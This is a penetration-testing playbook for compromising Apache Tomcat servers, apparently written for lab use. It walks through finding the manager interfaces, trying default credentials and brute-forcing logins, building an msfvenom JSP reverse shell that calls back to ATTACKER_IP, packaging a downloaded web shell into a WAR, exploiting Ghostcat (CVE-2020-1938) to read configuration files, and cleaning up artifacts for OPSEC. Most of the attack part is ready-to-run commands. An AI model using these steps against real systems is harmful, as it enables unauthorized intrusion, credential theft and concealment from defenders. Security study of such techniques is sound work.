# Apache Tomcat Assessment
**Concept:** Tomcat hosts Java web applications. The administrative interfaces (`/manager` and `/host-manager`) are critical control points. 
**Attack Surface:** Default Credentials, Manager App Abuse (WAR Upload), Ghostcat (AJP LFI).
## 1. Discovery & Fingerprinting
**Goal:** Identify Tomcat instances, versions, and exposed administrative interfaces.
### HTTP Fingerprinting
Tomcat often exposes default documentation or specific error pages.
```shell
# Check for default docs
curl -s http://<TARGET_IP>:8080/docs/ | grep "Tomcat"
```
### Directory Enumeration
Locate the management interfaces.
```shell
# Target: /manager/html (Web UI) and /host-manager/html
gobuster dir -u http://<TARGET_IP>:8080/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```
### Port Scanning (AJP)
Tomcat uses the Apache JServ Protocol (AJP) on port **8009** for internal proxying. This port is often overlooked but critical for the Ghostcat vulnerability.
```shell
nmap -sV -p 8080,8009 <TARGET_IP>
```
## 2. Credential Access (Manager Login)
**Goal:** Gain access to the `/manager/html` interface.
### Default Credentials
Always check these first manually:
- `tomcat:tomcat`
- `admin:admin`
- `tomcat:s3cret`
- `admin:password`
### Automated Brute-Force (Python)
If defaults fail, target the Basic Authentication mechanism.
```shell
# Syntax: python3 mgr_brute.py -U <URL> -P <Path> -u <UsersFile> -p <PassFile>
python3 mgr_brute.py -U http://10.129.201.58:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```
**OPSEC Warning:** This generates significant HTTP 401 noise in access logs.
## 3. Exploitation: Authenticated RCE (WAR Upload)
**Concept:** The Manager App allows administrators to upload and deploy Web Application Archives (`.war`). A `.war` file is simply a ZIP containing Java class files or JSP scripts. By uploading a malicious `.war`, we achieve code execution.
### Payload Generation (MSFVenom)
Create a reverse shell payload packaged as a WAR file.
```shell
# Generate payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<LISTENER_PORT> -f war > backup.war
```
### Manual Payload Construction (JSP Shell)
Alternatively, package a simple web shell.
```shell
# 1. Download cmd.jsp (e.g., from SecLists or TenNc)
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp

# 2. Create WAR archive
zip -r shell.war cmd.jsp
```
### Execution
1. **Deploy:** Log in to `/manager/html`, scroll to **WAR file to deploy**, select `backup.war` (or `shell.war`), and click **Deploy**.
2. **Verify:** The application path (e.g., `/backup`) will appear in the applications list.
3. **Trigger:**
    - _Reverse Shell:_ Access `http://<TARGET_IP>:8080/backup/` (Trigger the JSP).
    - _Web Shell:_ Access `http://<TARGET_IP>:8080/shell/cmd.jsp?cmd=id`.
**OPSEC Cleanup:** Click **Undeploy** in the Manager interface immediately after stabilizing your shell to remove artifacts from the `webapps` directory.
## 4. Exploitation: Ghostcat (CVE-2020-1938)
**Concept:** An unauthenticated Local File Inclusion (LFI) vulnerability in the AJP connector (port 8009). It allows reading files inside the `webapps` directory (e.g., `WEB-INF/web.xml`) and can lead to RCE if file upload is possible elsewhere. 
**Affected Versions:** Tomcat 6.x, 7.x < 7.0.100, 8.x < 8.5.51, 9.x < 9.0.31.
### LFI Execution
Use a dedicated script (e.g., `tomcat-ajp.lfi.py`) to communicate with the AJP port.
```shell
# Syntax: python2.7 tomcat-ajp.lfi.py <TARGET_IP> -p 8009 -f <FILE_PATH>
# Note: Path is relative to the webapps ROOT.
python2.7 tomcat-ajp.lfi.py 10.129.201.58 -p 8009 -f WEB-INF/web.xml
```

**Target Files:**
- `WEB-INF/web.xml`: Reveal mappings and configuration. 
- `META-INF/context.xml`: Often contains hardcoded database credentials.
## 5. Post-Exploitation: Configuration Analysis
**Goal:** Extract further credentials or understand the application logic from the file system.
### Key Configuration Files
- **`conf/tomcat-users.xml`**: Defined users, passwords, and roles (`manager-gui`, `admin-gui`).
- **`conf/server.xml`**: Port configurations and Connector settings.
- **`webapps/ROOT/WEB-INF/web.xml`**: Servlet mappings. Look for custom classes (e.g., `com.company.api.AdminServlet`) to target for decompilation/reverse engineering.